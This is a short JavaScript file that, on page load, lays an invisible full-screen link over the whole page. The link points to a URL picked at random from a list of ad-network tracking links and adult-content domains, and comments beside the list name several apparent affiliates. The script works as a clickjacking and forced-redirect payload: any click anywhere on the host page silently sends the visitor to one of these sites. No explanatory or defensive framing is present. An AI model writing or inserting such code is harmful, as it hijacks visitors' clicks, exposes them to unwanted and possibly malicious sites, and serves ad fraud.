function createLink() {
  var urls = [
    // hil: db (ss)
    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    "https://www.qrcreate.online",

    // hil: Brian
    "https://aggravatingoil.com/bD3.V/0WPd3Np/vubMm/VqJbZWDa0q1lNtT-QsyRMmj/Ew2XL_TmUQ1sN/DlIDyoMyTqcg",
    "https://json.navigateall.com",

    // hil: Thomas
    "https://experiencedturn.com/bn3/V.0KPm3rp/vYb-mOVkJFZKDq0m1CNzjIAN1rMHDIgJyeLETjUp2wMeDkUPwyOIDOMs",
    "https://loveskill.mjsj.sbs/tags/",

    // hil: Jacklove
    "https://gentle-report.com/b.3_VC0XPt3vpFvIbCmtV/JaZ/D/0p1xNCjVALwbN/TqQPyPLUTkUG2wMQDBA/1YNxDjMC",
    "https://sexylove.mjsj.sbs/",

    // mon: lucy
    // "https://phuruxoods.com/4/7683326",
    // "https://whauzavouweb.com/4/7683329",
    // "https://naglelri.net/4/7683327",
    // "https://fouwhigrezi.net/4/7683328",
    // "https://boovoogie.net/4/7683330",
    // "https://rangauck.com/4/7683319",
    
    // "https://json.qrcreate.online",
    // "https://dubzenom.com/4/7782127",

    // juicy
    "https://sexytalk.mjsj.sbs/tags/",

    // // pending
    // "https://hot123.top/tags/",

    // hil: db123
    "https://sexystory.navigateall.com/tags/",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);
